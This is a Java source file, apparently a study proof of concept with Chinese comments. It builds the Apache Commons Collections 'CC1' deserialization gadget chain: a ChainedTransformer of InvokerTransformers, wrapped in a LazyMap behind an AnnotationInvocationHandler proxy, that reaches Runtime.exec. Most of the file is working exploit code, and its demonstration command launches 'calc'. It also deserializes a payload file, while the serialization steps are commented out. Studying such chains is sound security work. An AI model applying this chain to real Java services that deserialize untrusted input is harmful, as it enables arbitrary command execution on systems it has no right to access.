package org.example;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.HashedMap;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.Map;
import java.lang.reflect.Proxy;
import java.io.FileOutputStream;
import java.io.FileInputStream;
public class CC1LazyMap {
    public static void main(String[] args) throws Exception {


//        Runtime r=Runtime.getRuntime();
        //Runtime没有继承Serializable，无法被序列化，需要通过Runtime的原型来反射调用getRuntime
//        Class rc=Class.forName("java.lang.Runtime");
//        Method getRuntime=rc.getDeclaredMethod("getRuntime");
//        Runtime r=(Runtime)getRuntime.invoke(null,null);
//        Method exec=rc.getDeclaredMethod("exec", String.class);
        //exec.invoke(r,"calc");

        //用InvokerTransformer来触发调用exec
//        Method getRuntime=(Method)new InvokerTransformer("getDeclaredMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}).transform(Runtime.class);
//        Runtime r=(Runtime)new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}).transform(getRuntime);
//        new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"}).transform(r);
        //使用ChainedTransformer将上述过程进行串联
        Transformer[] transformers=new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getDeclaredMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
//        chainedTransformer.transform(Runtime.class);


//        invokerTransformer.transform(r);
        HashedMap map=new HashedMap();
        map.put("value","cc1");
        Map<Object,Object> lazyMap= LazyMap.decorate(map,chainedTransformer);
        //get会触发transform
        //transform可以触发反射执行任意命令

//        for(Map.Entry entry: transformedMap.entrySet() ){
//            entry.setValue(r);
//        }

        //通过代理是readObejct调用函数时出发invoke、
        //invoke中调用了get
        Class c=Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor=c.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        InvocationHandler invocationHandler=(InvocationHandler)constructor.newInstance(Target.class,lazyMap);
        Map proxyMap = (Map)Proxy.newProxyInstance(c.getClassLoader(),new Class[]{Map.class},invocationHandler);
        InvocationHandler o = (InvocationHandler)constructor.newInstance(Target.class,proxyMap);
//base64
//        ByteArrayOutputStream buffer=new ByteArrayOutputStream();
//        ObjectOutputStream objectOutputStream=new ObjectOutputStream(buffer);
//        objectOutputStream.writeObject(o);
//        String data = Base64.getEncoder().encodeToString(buffer.toByteArray());
//        System.out.println(data);
//
//        byte[] bytes=Base64.getDecoder().decode(data.getBytes(StandardCharsets.UTF_8));
//        ByteArrayInputStream b = new ByteArrayInputStream(bytes);
//        ObjectInputStream input = new ObjectInputStream(b);
//        input.readObject();

// 写文件
//        //序列化
//        ObjectOutputStream objectOutputStream=new ObjectOutputStream(new FileOutputStream("./cc1.txt"));
//        objectOutputStream.writeObject(o);
//        objectOutputStream.close();
//        //反序列化
        ObjectInputStream objectInputStream=new ObjectInputStream(new FileInputStream("./cc1.txt"));
        objectInputStream.readObject();
    }
}